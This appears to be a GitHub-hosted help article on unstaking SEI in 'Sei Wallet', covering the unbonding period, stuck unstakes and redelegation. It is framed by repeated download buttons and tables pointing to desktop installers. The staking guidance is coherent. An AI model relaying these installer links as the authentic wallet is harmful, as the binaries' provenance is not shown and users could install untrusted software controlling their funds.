![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">Unstaking SEI in Sei Wallet: the unbonding wait and stuck unstakes</h1>

<p align="center">Why the exit takes 21 days, what a stuck unstake means, and what to do.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Unstaking does not return your coins. It starts a queue. The coins stop earning, stop being spendable and stop being transferable, and they arrive back in your liquid balance only when the period the chain sets has elapsed. Sei Wallet has staking and unbonding built in, so the button is easy to find - the waiting is the part that surprises people.

This article covers what the button actually does, why nobody should quote you a fixed number of days, and the two ways an unstake gets stuck: no gas to pay for it, and a position the wallet can see but cannot sign for.

## What the button actually does

A delegation is a state on the chain, recorded against your account and a validator. Unbonding reverses that state: the stake leaves the validator's delegation and enters an unbonding entry in your own account. Several things change at once.

- **Rewards stop.** The position is no longer bonded, so it is no longer earning.
- **The balance is not spendable.** An unbonding entry is not liquid SEI; you cannot send it, stake it or use it as gas.
- **It is still yours.** No validator or third party can move it while it waits.
- **It is still visible.** The app should show the entry with the time remaining, which is how you tell a normal wait from a failed transaction.

Whether stake that is already unbonding can still be penalised for a validator's earlier misbehaviour is a chain rule rather than an app setting. The delay exists partly for that reason. Confirm the current rule on the staking page or in Sei's own documentation rather than trusting a summary - including this one.

## How long it takes

The unbonding period is a network parameter. It is not chosen by the wallet, it is not a countdown the app can shorten, and it can be changed by governance. That has a practical consequence: any article, video or support reply that states a fixed number of days is describing the parameter as it stood when it was written.

Sei's own documentation states 21 days for the unbonding period, in its SIP-03 migration guide as read on 12 November 2026. That is the best current figure and worth planning around, but it remains a parameter rather than a promise: confirm it in the app before you commit, because a governance change would not update this article. The app's staking view is the place to look, and it is also where the remaining time on an existing entry is shown. Plan around that number rather than around a memory of it.

What you can rely on is the shape: you can start an exit at any time, you cannot cancel it once started, and the coins become liquid when the period ends - not when you click.

## The most common stuck unstake: no gas left

This is the failure that catches people who stake their entire balance. The unbonding transaction is a transaction, so it needs a fee, and the fee is paid in liquid SEI. If every coin you hold is bonded, you have nothing to pay with. The position is safe and the button will not work.

The fix is unglamorous: get a small amount of SEI to that exact address from somewhere else - another wallet of yours, an exchange withdrawal - and then unstake. What does not work is waiting, reinstalling, or restoring the wallet; none of those creates a balance.

Prevention belongs in the delegation transaction, not in hindsight: size the stake so the remainder still covers an unbonding fee, and the exit stays a button instead of becoming a rescue. If you have not staked yet, [the staking guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) covers the reserve as part of the setup.

One warning belongs here. If you post "I need 0.5 SEI to unstake" in a public channel, you will be contacted by people offering to send it. Some will ask you to "verify" your wallet first, or send you a link to claim it. That is the scam pattern, not a favour, and it is described in [the safety assessment](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).

## When the position is visible but the button does nothing

The second stuck case looks like a display bug and is usually an account problem. A wallet can show a bonded position read-only - for example through a legacy `sei1` view of an account whose signing path is the EVM side - and a read-only view cannot sign an unbonding transaction. Seeing a balance is not the same as controlling it.

The symptoms are consistent: the position and the validator are named correctly, the unstake control either fails or is unavailable, and nothing appears in the unbonding list afterwards.

Diagnose it by address rather than by the app's label:

1. Note the address the position is displayed under.
2. Check that the account you are signing from is the same account, in the same format.
3. If two formats of one account are involved, confirm which one holds the position and which one your wallet signs for.

The two-format model is the source of most of this confusion, and [the two-format address model](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) explains why one account can appear twice with different prefixes. If your position is tied to a hardware wallet, the derivation question is a third possibility, and a different derivation means a genuinely different account rather than a different view.

## Pending, and what pending means

An unbonding entry that sits in the list with time remaining is working correctly. The word "pending" there describes the queue, not a stalled transaction.

A transaction that never confirms is a different problem: it has not entered the queue at all, so the position stays bonded and the clock has not started. The distinguishing check is whether an entry exists in the unbonding list with an amount and a completion time. If it does, you are waiting. If it does not, nothing has started, and the transaction itself needs attention - usually a fee, a network mismatch, or a device that did not approve the signature.

## Redelegating is not unstaking

If your goal is to move stake to a different validator, redelegation is usually the right tool. It is immediate, the position stays bonded and it does not start the unbonding clock.

The chain limits how much can be redelegated repeatedly in a short window. Hitting that limit produces an error, and the error is the rule working rather than a fault in the app. If you need to move more than the limit allows, waiting is the only route; there is no setting that raises it.

## Frequently asked questions

**How long does it take to unstake SEI?** Sei's documentation states 21 days. It is a governance parameter rather than a constant, so confirm the current value in the app before you commit.

**Can I cancel an unstake?** No. Once the unbonding transaction confirms, the entry runs to completion. Redelegating instead of unstaking is the way to keep a position bonded.

**Do I lose my coins while waiting?** No. They are yours and visible, just not liquid, not transferable and not earning.

**Why is my unstake button greyed out?** Most often no liquid SEI to pay the fee, or the account you are signing from does not hold the position. Check the balance and the address before anything else.

**Can I unstake part of a position?** Yes. Unbonding works on amounts, so you can exit partially and leave the rest bonded - as long as you keep enough liquid for the fee.

**Does unstaking cost a fee?** Yes, one network fee for the unbonding transaction, paid in SEI. It is the reason a fully bonded account cannot exit without a top-up.

**Can I unstake while staking with a Ledger?** Yes. The device confirms the unbonding message like any other signature, which is also the moment to check the validator and amount on the device screen.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Staking rewards not showing in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/rewards-not-showing-up.md)
